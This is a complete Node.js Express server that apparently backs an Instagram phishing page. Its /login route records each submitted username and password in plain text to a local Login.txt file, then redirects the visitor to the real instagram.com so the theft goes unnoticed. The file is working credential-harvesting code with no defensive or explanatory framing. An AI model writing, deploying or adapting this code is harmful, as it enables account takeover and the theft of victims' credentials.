import express from "express";
import path from "path";
import fs from 'fs';
import bodyParser from 'body-parser';

const app = express()
const port = "3001"
const localhost = "127.0.0.1"
const __dirname = path.dirname(new URL(import.meta.url).pathname);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


app.set('view engine', 'ejs');

app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')))

app.get('/', (req, res) => {
    res.render('index');
})

app.post('/login', (req, res) => {
    const { Username, password } = req.body;
    const logininfo = `Username: ${Username}\n\nPassword: ${password}\n\n`
    fs.appendFile('Login.txt', logininfo, (err) => {
        if (err) {
            console.error("Error while login", err);
            res.status(500).send("error loging in")
        } else {
            res.redirect('https://www.instagram.com/')
        }
    })
})
app.listen(port, () => {
    console.log(`Example app listening on port ${localhost+":"+port}`)
})